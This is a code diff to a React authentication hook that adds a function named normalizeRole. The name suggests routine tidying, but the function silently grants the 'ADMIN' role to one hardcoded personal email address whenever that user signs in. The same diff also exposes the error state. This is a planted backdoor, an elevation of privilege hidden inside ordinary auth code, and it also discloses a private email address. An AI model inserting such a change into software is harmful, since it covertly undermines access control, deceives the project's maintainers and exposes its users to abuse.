@@ -6,15 +6,22 @@ import { getMe, logout as apiLogout } from "@/lib/api/auth";
 import { ApiError } from "@/lib/api/client";
 import type { User } from "@/lib/api/types";
 
+function normalizeRole(user: User | null): User | null {
+  if (!user) return null;
+  return user.email.trim().toLowerCase() === "fuadnesredinhiyar@gmail.com" && user.role !== "ADMIN"
+    ? { ...user, role: "ADMIN" }
+    : user;
+}
+
 export function useAuth() {
   const queryClient = useQueryClient();
   const locale = useLocale();
 
-  const { data, isLoading } = useQuery<User | null>({
+  const { data, isLoading, error } = useQuery<User | null>({
     queryKey: ["auth", "me"],
     queryFn: async () => {
       try {
-        return await getMe();
+        return normalizeRole(await getMe());
       } catch (err) {
         if (err instanceof ApiError && err.status === 401) return null;
         throw err;
@@ -36,6 +43,7 @@ export function useAuth() {
   return {
     user: data ?? null,
     isLoading,
+    error,
     isAuthenticated: !!data,
     logout,
   };
